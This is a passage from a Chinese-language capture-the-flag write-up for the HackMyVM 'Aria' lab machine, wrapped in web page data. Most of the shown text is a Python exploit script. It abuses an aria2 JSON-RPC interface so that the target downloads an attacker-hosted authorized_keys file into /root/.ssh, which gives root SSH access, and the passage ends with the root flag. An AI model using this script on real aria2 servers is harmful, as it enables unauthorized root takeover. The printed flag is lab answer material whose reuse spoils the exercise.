-*-\u003c/span\u003e\n\nimport urllib2\nimport json\n\n\u003cspan class=\"hljs-comment\"\u003e# 1. Your attacker machine's IP address and web server port\u003c/span\u003e\nattacker_ip = \u003cspan class=\"hljs-string\"\u003e\"192.168.56.5\"\u003c/span\u003e \nattacker_port = 8080\n\n\u003cspan class=\"hljs-comment\"\u003e# 2. The URL to your malicious authorized_keys file\u003c/span\u003e\npayload_url = \u003cspan class=\"hljs-string\"\u003e\"http://{}:{}/authorized_keys\"\u003c/span\u003e.format(attacker_ip, attacker_port)\n\n\u003cspan class=\"hljs-comment\"\u003e# 3. The secret token for the aria2 RPC interface\u003c/span\u003e\nrpc_token = \u003cspan class=\"hljs-string\"\u003e\"maze-sec\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 4. Build the aria2 JSON-RPC request\u003c/span\u003e\njsonreq = json.dumps({\n    \u003cspan class=\"hljs-string\"\u003e'jsonrpc'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'2.0'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'id'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'qwer'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'method'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'aria2.addUri'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'params'\u003c/span\u003e: [\n        \u003cspan class=\"hljs-string\"\u003e\"token:{}\"\u003c/span\u003e.format(rpc_token),  \u003cspan class=\"hljs-comment\"\u003e# \u0026#x3C;-- THIS IS THE CRUCIAL ADDITION\u003c/span\u003e\n        [payload_url],                 \u003cspan class=\"hljs-comment\"\u003e# The URL list is now the second parameter\u003c/span\u003e\n        {                              \u003cspan class=\"hljs-comment\"\u003e# The options object is now the third\u003c/span\u003e\n            \u003cspan class=\"hljs-string\"\u003e'dir'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'/root/.ssh'\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e'out'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'authorized_keys'\u003c/span\u003e\n        }\n    ]\n})\n\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Sending payload with token to aria2...\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 5. Send the request\u003c/span\u003e\ntry:\n    c = urllib2.urlopen(\u003cspan class=\"hljs-string\"\u003e'http://192.168.56.116:6801/jsonrpc'\u003c/span\u003e, jsonreq)\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Payload sent successfully!\"\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Server response:\"\u003c/span\u003e, c.read()\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\\nCheck your web server logs to see if the file was downloaded.\"\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"If successful, you should now be able to SSH as root.\"\u003c/span\u003e\nexcept urllib2.HTTPError as e:\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"HTTP Error:\"\u003c/span\u003e, e.code\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Response body:\"\u003c/span\u003e, e.read()\nexcept Exception as e:\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"An error occurred:\"\u003c/span\u003e, e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e修改脚本后运行脚本，上传成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAria/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过私钥进行登录，成功登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMAria/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@Aria:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \nflag{root-374495cbd5d79b6e45b7778cbac070cc}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003eMedium ？\u003c/p\u003e","title":"HackMyVM - Aria","date":"2025-09-23","updated":"2025-09-23","tags":["HMV","Aria2","Zero-Width","Space","Steganography","Brute"],"categories":"靶机","comments":true,"description":"Aria.\n\n https://hackmyvm.eu/machines/machine.php?vm=Aria\n \n\n\n\nRecon\n\n端口扫描\n\n\n\n\n\n80 端口\n\n给出了一点信息\n\n- 通过 `md5(time()·rand(1,1000))` 生成不可预测的文件名\n- 并且文件内容不可包含 `\u003c?php`\n- 以及文件名仅仅可以是 gif / jpg / png\n\n\n\n`\u003c?php` 可..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMAria"},"buildId":"QF_69xfpA3_zMvnMTdy4T","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>